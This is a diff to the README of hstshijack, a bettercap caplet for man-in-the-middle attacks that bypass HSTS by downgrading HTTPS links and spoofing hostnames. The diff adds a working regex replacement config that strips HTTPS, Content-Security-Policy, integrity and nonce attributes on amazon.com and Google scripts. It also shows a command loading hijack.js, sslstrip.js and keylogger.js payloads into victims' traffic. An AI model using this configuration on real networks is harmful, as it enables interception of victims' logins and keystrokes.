@@ -39,16 +39,14 @@ dns.proxy on
 
 ### <a href="./payloads/hijack.js">**hijack.js**</a> payload
 
-This module injects files with a JavaScript payload (<a href="./payloads/hijack.js">**hijack.js**</a>) which acts as a callback for bettercap, and takes care of hostname spoofing in attributes of injected documents, as well as fetch and XMLHttpRequest.
-
-Injecting <a href="./payloads/hijack.js">**hijack.js**</a> is essential for hostname spoofing.
+This module injects files with a JavaScript payload (<a href="./payloads/hijack.js">**hijack.js**</a>) which acts as a callback for bettercap, and takes care of hostname spoofing in the DOM.
 
 ### Scalable domain indexing (SSL log)
 
 <br>
 
 <p align="center">
-  <img src="https://raw.githubusercontent.com/buffermet/cdn/refs/heads/master/github.com/bettercap/caplets/hstshijack/ssl.index.png" alt="Indexed domains that use HTTPS" />
+  <img src="https://raw.githubusercontent.com/buffermet/cdn/master/github.com/bettercap/caplets/hstshijack/ssl.index.png" alt="Indexed domains that use HTTPS" />
 </p>
 
 When hosts respond with an HTTPS redirect, bettercap will save their hostname in lists that are sorted by domain prefixes, allowing the list to scale by reducing a considerable amount of overhead for the proxy module.
@@ -74,7 +72,40 @@ You can try to make them as unnoticeable as you can, but your options are limite
 
 ### Regular Expression replacements
 
-...
+In the <a href="https://github.com/bettercap/caplets/blob/master/hstshijack/replacements">**replacements directory**</a> you can find 5 JSON files that are used to spoof HTTP requests and responses. Each Regular Expression that you configure will be pre-compiled when the module is loaded.
+
+Each Regular Expression set is formatted as follows: `[SELECTOR, FLAGS, REPLACEMENT]`
+
+Example of response body replacements (<a href="https://raw.githubusercontent.com/bettercap/caplets/refs/heads/master/hstshijack/replacements/res.Body.json">res.Body.json</a>):
+
+```json
+{
+	"html": {
+		"*.amazon.com": [
+			["(['\"`](?:http|ws)|sourceMappingURL=http)s", "ig", "$1"],
+			["((?:['\"`](?:(?:http|ws)://|//)?|sourceMappingURL=http://)[a-z0-9-.]+)[.]com([^a-z0-9-.]|$)", "ig", "$1.corn$2"],
+			[" http-equiv=['\"]?content-security-policy(?:-report-only)?['\"]?([ />])", "ig", "$1"],
+			[" integrity=['\"][^'\"]+['\"]([ />])", "ig", "$1"],
+			[" nonce=[\"][^\"]+['\"]([ />])", "ig", "$1"]
+		]
+	},
+	"javascript": {
+		"*.amazon.com": [
+			["((?:['\"`]|sourceMappingURL=)(?:http|ws))s", "ig", "$1"],
+			["((?:['\"`](?:(?:http|ws)://|//)?|sourceMappingURL=http://)[a-z0-9-.]+)[.]com([^a-z0-9-.]|$)", "ig", "$1.corn$2"]
+		],
+		"apis.google.com": [
+			["(V=function\\(a\\)\\{)", "g", "$1if(1)return;"]
+		]
+	},
+	"json": {
+		"*": [
+			["(\"(?:http|ws))s", "ig", "$1"],
+			["(\"(?:(?:http|ws)://|//)?[a-z0-9-.]+)[.]com([^a-z0-9-.]|$)", "ig", "$1.corn$2"]
+		]
+	}
+}
+```
 
 ### Block scripts
 
@@ -89,7 +120,7 @@ Custom payloads are (optionally) obfuscated at launch, executed synchronously, a
 Example:
 
 ```sh
-set hstshijack.payloads        *:/usr/local/share/bettercap/caplets/hstshijack/payloads/hijack.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js
+set hstshijack.payloads *:/usr/local/share/bettercap/caplets/hstshijack/payloads/hijack.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js
 ```
 
 You should always inject the <a href="./payloads/hijack.js">**hijack.js**</a> payload when spoofing hostnames.
